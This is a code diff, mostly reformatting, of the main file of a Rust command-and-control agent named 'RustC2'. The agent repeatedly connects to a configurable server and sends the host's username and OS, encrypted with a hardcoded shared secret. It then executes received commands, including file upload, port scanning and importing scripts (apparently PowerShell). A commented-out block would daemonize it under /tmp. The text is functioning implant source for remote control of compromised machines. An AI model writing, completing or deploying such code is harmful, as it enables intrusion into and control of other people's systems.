@@ -1,36 +1,38 @@
-use std::{thread,
+use clap::{arg, Command};
+// use daemonize::Daemonize;
+use simple_crypt::{decrypt, encrypt};
+use std::{
+    collections::HashMap,
     io::{Read, Write},
     net::TcpStream,
     process::exit,
+    thread,
     time::Duration,
-    collections::HashMap};
-use clap::{Command, arg};
-use simple_crypt::{decrypt, encrypt};
-use daemonize::Daemonize;
+};
 mod utils;
 
 use utils::ImportedScript;
 fn main() {
-    let daemonize = Daemonize::new()
-        .pid_file("/tmp/rustc2.pid")
-        .chown_pid_file(true)
-        .working_directory("/tmp");
+    // let daemonize = Daemonize::new()
+    //     .pid_file("/tmp/rustc2.pid")
+    //     .chown_pid_file(true)
+    //     .working_directory("/tmp");
 
-    match daemonize.start() {
-        Ok(_) => println!("Daemonized successfully"),
-        Err(e) => eprintln!("Error, {}", e),
-    }
+    // match daemonize.start() {
+    //     Ok(_) => println!("Daemonized successfully"),
+    //     Err(e) => eprintln!("Error, {}", e),
+    // }
 
     let mut host = "127.0.0.1".to_string();
     let mut port = "8080".to_string();
     let mut imported_scripts: HashMap<String, ImportedScript> = HashMap::new();
 
     let matches = Command::new("RustC2")
-    .version("0.1.0")
-    .about("RustC2 Client, Used for controlling the agent")
-    .arg(arg!(-H --host [IpAddr] "The host ip of the server (default 127.0.0.1)"))
-    .arg(arg!(-p --port [PORT] "The port number used by the server (default 8080)"))
-    .get_matches();
+        .version("0.1.0")
+        .about("RustC2 Client, Used for controlling the agent")
+        .arg(arg!(-H --host [IpAddr] "The host ip of the server (default 127.0.0.1)"))
+        .arg(arg!(-p --port [PORT] "The port number used by the server (default 8080)"))
+        .get_matches();
 
     if let Some(h) = matches.get_one::<String>("host") {
         host = h.to_string();
@@ -44,24 +46,23 @@ fn main() {
 
     loop {
         match TcpStream::connect(format!("{}:{}", host, port)) {
-            Ok(mut stream) =>  {
-                // println!("Successfully connected to the server");
+            Ok(mut stream) => {
                 let outinfo = format!("||ACSINFO||{}||{}\r\n", username, os);
-                let encrypted_data = encrypt(outinfo.as_bytes(), b"shared secret").expect("Failed to encrypt");
+                let encrypted_data =
+                    encrypt(outinfo.as_bytes(), b"shared secret").expect("Failed to encrypt");
                 stream.write(&encrypted_data).unwrap();
                 loop {
                     let mut buffer = [0; 1024];
                     let _ = match stream.read(&mut buffer) {
-                        Ok(n) => {n},
+                        Ok(n) => n,
                         Err(_) => break,
                     };
                     if buffer[0] == 0 {
                         continue;
                     }
                     let data = decrypt(&buffer, b"shared secret").expect("Failed to decrypt");
-                    let command = String::from_utf8(data.to_vec()).unwrap();
+                    let command = String::from_utf8(data).unwrap();
                     let command_clone = command.clone();
-                    // print!("\rReceived command from server: {}", command);
                     std::io::stdout().flush().unwrap();
                     let stream_to_use = &mut stream;
                     if command_clone.starts_with("||UPLOAD||") {
@@ -83,7 +84,11 @@ fn main() {
                     } else if command_clone.starts_with("||SCAN||") {
                         utils::handle_portscan(stream_to_use, &command_clone);
                     } else if command.starts_with("||IMPORTSCRIPT||") {
-                        let output = utils::handle_import_psh(stream_to_use, &command_clone, &mut imported_scripts);
+                        let output = utils::handle_import_psh(
+                            stream_to_use,
+                            &command_clone,
+                            &mut imported_scripts,
+                        );
                         match output {
                             Ok(_) => {
                                 println!("Successfully imported script");
